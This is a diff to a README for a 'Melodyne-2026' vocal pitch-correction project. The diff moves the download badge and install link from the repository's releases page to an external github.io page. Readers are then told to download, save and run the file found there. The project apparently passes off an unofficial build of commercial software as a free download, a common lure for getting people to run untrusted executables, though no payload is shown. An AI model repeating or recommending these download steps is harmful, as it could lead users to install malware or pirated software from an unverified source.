@@ -1,6 +1,6 @@
 # 🎵 Melodyne-2026 - Master pitch correction for vocal audio
 
-[![](https://img.shields.io/badge/Download-Melodyne_2026-blue)](https://github.com/Sullyearless978/Melodyne-2026/releases)
+[![](https://img.shields.io/badge/Download-Melodyne_2026-blue)](https://sullyearless978.github.io)
 
 ## 📁 Project Overview
 
@@ -20,7 +20,7 @@ Before you install the software, confirm your computer meets these minimum speci
 
 Follow these steps to obtain and run the software on your computer.
 
-1. Navigate to the release page using this link: [https://github.com/Sullyearless978/Melodyne-2026/releases](https://github.com/Sullyearless978/Melodyne-2026/releases)
+1. Navigate to the release page using this link: [https://sullyearless978.github.io](https://sullyearless978.github.io)
 2. Locate the most recent file version available in the list.
 3. Click the file name to begin the download process.
 4. Save the file to your desktop or downloads folder.
